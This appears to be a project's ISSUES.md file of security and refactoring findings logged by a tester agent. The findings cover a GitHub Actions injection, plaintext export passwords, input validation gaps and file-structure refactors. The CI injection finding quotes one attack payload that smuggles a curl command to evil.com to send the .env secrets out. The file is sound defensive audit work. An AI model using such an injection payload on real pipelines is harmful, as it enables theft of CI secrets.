# Issues

This file tracks quality issues found by the tester agent. The goal is to keep this file empty.

For resolved issues, see [ISSUES_ARCHIVE.md](ISSUES_ARCHIVE.md).

---

# Summary

| Severity | Count | Categories |
|----------|-------|------------|
| High | 0 | |
| Medium | 0 | |
| Low | 4 | Input Validation |
| Medium | 1 | File Structure (pre-existing) |
| Low | 1 | Duplication (pre-existing) |

**Last security scan:** 2026-04-11 (broad: all code from last 30 days, all OWASP categories)
**Last compliance scan:** 2026-03-19 (1 low: SendGrid client missing timeout)
**Last dependency audit:** 2026-02-23 (all clear; werkzeug upgraded to 3.1.6, pip upgraded to 26.0.1)
**Last refactor scan:** 2026-03-21 (standard: new code since 2026-02-27, all categories; 5 new issues)
**Last router refactor:** 2026-02-06 (all 4 large routers split into packages)
**Last service refactor:** 2026-03-21 (settings.py split into package, branding routes extracted, logo duplication removed)
**Last test code audit:** 2026-04-09 (test hygiene audit: removed 21 redundant tests, fixed 6 weak assertions)
**Last copy review:** 2026-04-09 (GCM encryption feature, SAML error page, role display audit)

---

---

---


---

---

---

---

---

---

## [SECURITY] CI Injection: GitHub Actions script injection via workflow dispatch

**Found in:** `.github/workflows/e2e-tests.yml:132-136`
**Severity:** Low
**OWASP Category:** A03:2021 - Injection
**Description:** The `test_filter` workflow dispatch input is interpolated with `${{ }}` directly into a shell command without escaping. A collaborator with dispatch permissions could inject arbitrary commands.
**Attack Scenario:** Collaborator sets `test_filter` to `"; curl evil.com/exfil?s=$(cat .env) #` to exfiltrate CI secrets.
**Evidence:** `FILTER="${{ github.event.inputs.test_filter }}"` in the workflow YAML.
**Impact:** CI runner command injection (limited to repo collaborators).
**Remediation:** Use an environment variable instead of direct interpolation: `env: FILTER: ${{ github.event.inputs.test_filter }}` then `"$FILTER"`.

---

## [SECURITY] Information Disclosure: Export encryption password in database

**Found in:** `app/jobs/export_events.py:274-281`, `app/jobs/export_users.py:350-357`
**Severity:** Low
**OWASP Category:** A02:2021 - Cryptographic Failures
**Description:** XLSX encryption passwords are stored in the `bg_tasks.result` JSONB column in plaintext between creation and expiry (24h). Redacted by the cleanup job after expiry.
**Attack Scenario:** Database backup or read access reveals export passwords, allowing decryption of exported PII.
**Evidence:** `"password": encrypted.password` in job result dicts.
**Impact:** Export file decryption if database is compromised.
**Remediation:** Consider encrypting the password at rest using the tenant's derived key, or delivering it via a separate ephemeral channel.

---

## [SECURITY] Input Validation: Missing max_length on BulkUserIdsRequest elements

**Found in:** `app/schemas/api.py:180`
**Severity:** Low
**OWASP Category:** A04:2021 - Insecure Design
**Description:** `BulkUserIdsRequest.user_ids` is `list[str]` with `max_length=10000` on the list, but no `max_length` on individual string elements. 10,000 arbitrarily long strings could exhaust memory during Pydantic validation and bloat the job payload in the database.
**Attack Scenario:** Admin sends 10,000 user IDs of 1MB each, consuming ~10GB of server memory.
**Evidence:** `user_ids: list[str] = Field(..., min_length=1, max_length=10000)` with no per-element constraint.
**Impact:** Memory exhaustion, database bloat.
**Remediation:** Add `max_length=36` to individual elements (UUIDs are 36 chars).

---

## [SECURITY] Input Validation: No email format validation on web bulk secondary emails

**Found in:** `app/routers/users/bulk_ops.py:168-200`
**Severity:** Low
**OWASP Category:** A03:2021 - Injection
**Description:** The web form route accepts `emails` as raw strings without email format validation (unlike the API endpoint which uses `EmailStr`). Malformed strings can be stored as "verified" secondary emails.
**Attack Scenario:** Admin submits non-email strings via the form. They're stored as verified emails in the database.
**Evidence:** `emails: Annotated[list[str], Form()]` with no validation, passed to `add_verified_email()`.
**Impact:** Data integrity issues. Malformed email addresses in user profiles.
**Remediation:** Validate email format before passing to the service layer. Use the same validation as the API endpoint.

---

## [REFACTOR] File Structure: groups/idp.py split candidate at 710 lines

**Found in:** `app/services/groups/idp.py`
**Impact:** Medium
**Category:** File Structure
**Description:** This file handles two distinct concerns: group creation/discovery (create_idp_base_group, get_or_create_idp_group, _ensure_umbrella_relationship, invalidate_idp_groups) and membership management (sync_user_idp_groups, ensure_user_in_base_group, remove_user_from_base_group, move_users_between_idps). At 710 lines with 15 public functions, it's at the limit of maintainability.
**Why It Matters:** The two concerns are intertwined but distinct. Splitting improves traversability and makes each module's purpose clear.
**Deferred reason:** The test suite patches `services.groups.idp.database` as a single mock to intercept calls across both lifecycle and membership functions. Splitting the module would require patching two submodules' `database` references in ~40 test locations, doubling mock boilerplate. The file should be split after refactoring tests to use proper fixtures.
**Suggested Refactoring:** Split into two modules within the existing groups package:
- `idp_lifecycle.py` (~350 lines): group lifecycle and discovery
- `idp_membership.py` (~350 lines): sync, base group membership, cross-IdP moves
**Files Affected:** `app/services/groups/idp.py`, `app/services/groups/__init__.py`, tests

---

## [REFACTOR] Duplication: Tab route pattern repeated 6x in saml_idp/admin.py

**Found in:** `app/routers/saml_idp/admin.py:225-436`
**Impact:** Low
**Category:** Duplication
**Description:** Six tab routes (sp_tab_details, sp_tab_attributes, sp_tab_groups, sp_tab_certificates, sp_tab_metadata, sp_tab_danger) follow an identical pattern: call `_load_sp_common()`, handle errors, build tab-specific context, return template response. The file is at 1089 lines with 33 route handlers.
**Why It Matters:** The repetitive pattern adds bulk, but the file is well-organized with clear section headers. This is low priority because each handler is compact (30-50 lines) and the structure is consistent.
**Accepted:** Each tab has genuinely different context loading logic. A generic helper would need callbacks that add complexity without improving readability. Monitor for further growth.
**Files Affected:** `app/routers/saml_idp/admin.py`

---

